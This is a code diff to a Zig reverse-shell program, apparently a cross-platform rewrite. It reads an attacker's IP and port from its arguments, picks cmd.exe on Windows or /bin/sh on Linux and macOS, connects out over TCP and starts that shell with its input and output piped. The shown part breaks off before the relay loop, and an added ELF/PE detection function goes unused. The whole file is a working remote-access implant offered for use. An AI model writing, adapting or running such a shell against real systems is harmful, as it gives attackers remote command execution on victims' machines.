@@ -1,21 +1,78 @@
 const std = @import("std");
+const builtin = @import("builtin");
 
-// NOTE: change the ip or hostname
-const TARGET_HOSTNAME = "example.com";
-// NOTE: change the port
-const TARGET_PORT = 1337;
+// Function to detect if the current executable is ELF or PE
+fn detectExecutableFormat(allocator: std.mem.Allocator) !enum { ELF, PE, Unknown } {
+    // Get the path to our own executable
+    const exe_path = try std.fs.selfExePathAlloc(allocator);
+    defer allocator.free(exe_path);
+
+    // Open and read the first few bytes
+    const file = std.fs.cwd().openFile(exe_path, .{}) catch return .Unknown;
+    defer file.close();
+
+    var header: [64]u8 = undefined;
+    const bytes_read = file.readAll(&header) catch return .Unknown;
+
+    if (bytes_read < 4) return .Unknown;
+
+    // Check for ELF magic bytes (0x7f 'E' 'L' 'F')
+    if (header[0] == 0x7f and header[1] == 'E' and header[2] == 'L' and header[3] == 'F') {
+        return .ELF;
+    }
+
+    // Check for PE magic bytes ('M' 'Z')
+    if (header[0] == 'M' and header[1] == 'Z') {
+        return .PE;
+    }
+
+    return .Unknown;
+}
 
 pub fn main() !void {
     var gpa = std.heap.GeneralPurposeAllocator(.{}){};
     defer _ = gpa.deinit();
     const allocator = gpa.allocator();
 
-    const address_list = try std.net.getAddressList(allocator, TARGET_HOSTNAME, TARGET_PORT);
+    const args = try std.process.argsAlloc(std.heap.page_allocator);
+    defer std.process.argsFree(std.heap.page_allocator, args);
+    if (args.len != 3) {
+        std.debug.print("Usage: {s} <IP> <PORT>\n", .{args[0]});
+        return;
+    }
+
+    const target_hostname = args[1];
+    const target_port_str = args[2];
+
+    const target_port = std.fmt.parseInt(u16, target_port_str, 10) catch |err| {
+        std.debug.print("Error parsing port '{s}': {}\n", .{ target_port_str, err });
+        return;
+    };
+
+    var shell: []const []const u8 = undefined;
+
+    if (builtin.os.tag == .windows) {
+        shell = &[_][]const u8{"cmd.exe"};
+        std.debug.print("[+] Using cmd.exe as the shell\n", .{});
+    } else if ((builtin.os.tag == .linux) or (builtin.os.tag == .macos)) {
+        shell = &[_][]const u8{"/bin/sh"};
+        std.debug.print("[+] Using /bin/sh as the shell\n", .{});
+    } else {
+        std.debug.print("[-] Cannot detect target OS", .{});
+        return;
+    }
+
+    std.debug.print("[+] Connecting to {s}:{d}\n", .{ target_hostname, target_port });
+
+    const address_list = try std.net.getAddressList(allocator, target_hostname, target_port);
     defer address_list.deinit();
-    const socket = try std.net.tcpConnectToAddress(address_list.addrs[0]);
+    const socket = std.net.tcpConnectToAddress(address_list.addrs[0]) catch {
+        std.debug.print("[-] Host seems down. Cannot connect to the host.\n", .{});
+        return;
+    };
     defer socket.close();
 
-    var process = std.process.Child.init(&[_][]const u8{"cmd.exe"}, allocator);
+    var process = std.process.Child.init(shell, allocator);
     process.stdin_behavior = .Pipe;
     process.stdout_behavior = .Pipe;
     process.stderr_behavior = .Pipe;
